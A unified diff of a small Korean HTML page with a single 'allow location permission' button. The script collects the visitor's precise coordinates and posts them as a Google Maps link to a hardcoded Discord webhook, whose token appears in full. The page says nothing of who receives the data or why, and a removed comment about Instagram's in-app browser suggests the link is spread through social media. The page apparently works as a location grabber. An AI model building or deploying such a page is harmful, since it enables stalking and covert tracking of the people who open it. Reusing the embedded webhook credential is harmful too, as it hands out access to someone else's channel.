@@ -1,52 +1,83 @@
-<button id="locationBtn">📍 위치 권한 허용하기</button>
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>위치 공유</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+    }
+    .btn {
+      background: #5865F2;
+      color: white;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 8px;
+      font-size: 18px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <button class="btn" onclick="getLocation()">📍 위치 권한 허용하기</button>
+  
+  <script>
+    function getLocation() {
+      if (!navigator.geolocation) {
+        alert('브라우저가 위치 정보를 지원하지 않습니다.');
+        return;
+      }
+      
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const acc = position.coords.accuracy;
+          const msg = '📍 **위치**: https://maps.google.com/?q=' + lat + ',' + lon + '
+🗺️ **정확도**: ' + acc + 'm';
+          sendDiscord(msg);
+        },
+        function(error) {
+          alert('위치 권한을 허용해주세요. (오류: ' + error.message + ')');
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    }
+    
+    function sendDiscord(locationData) {
+      const webhookUrl = 'https://discord.com/api/webhooks/1527999868239482901/qUOQ1qwgXMtzRfFfj06rKD8BW_ExiVyyQBQFffZzdzi7kk1Qlm_acn_oAeGE2p2q2eqJ';
+      
+      const formData = new FormData();
+      formData.append('content', '📍 **위치 정보**
 
-<script>
-document.getElementById('locationBtn').addEventListener('click', async () => {
-  try {
-    // 위치 정보 가져오기
-    const position = await new Promise((resolve, reject) => {
-      navigator.geolocation.getCurrentPosition(resolve, reject, {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
+' + locationData);
+      
+      fetch(webhookUrl, {
+        method: 'POST',
+        body: formData
+      })
+      .then(function(res) {
+        if (res.ok) {
+          alert('✅ 위치 정보가 전송되었습니다!');
+        } else {
+          alert('❌ 전송 실패');
+        }
+      })
+      .catch(function(err) {
+        alert('❌ 오류: ' + err);
       });
-    });
-    
-    const { latitude, longitude, accuracy } = position.coords;
-    const locationData = `📍 **위치**: https://maps.google.com/?q=${latitude},${longitude}
-🗺️ **정확도**: ${accuracy}m`;
-    
-    // 디스코드로 전송
-    await sendToDiscord(locationData);
-    
-    alert('✅ 위치 정보가 전송되었습니다!');
-    
-  } catch (err) {
-    console.error('위치 오류:', err);
-    alert('📍 위치 권한을 허용해주세요.
-
-인스타그램 인앱 브라우저에서는 작동하지 않습니다.');
-  }
-});
-
-async function sendToDiscord(locationData) {
-  // 디스코드 웹훅 URL (자신의 서버 웹훅으로 교체)
-  const webhookUrl = 'https://discord.com/api/webhooks/1527999868239482901/qUOQ1qwgXMtzRfFfj06rKD8BW_ExiVyyQBQFffZzdzi7kk1Qlm_acn_oAeGE2p2q2eqJ';
-  
-  const fullMessage = `📍 **위치 정보**
-
-${locationData}`;
-  
-  const formData = new FormData();
-  formData.append('content', fullMessage);
-  
-  const response = await fetch(webhookUrl, {
-    method: 'POST',
-    body: formData
-  });
-  
-  if (!response.ok) {
-    throw new Error('전송 실패');
-  }
-}
-</script>
+    }
+  </script>
+</body>
+</html>
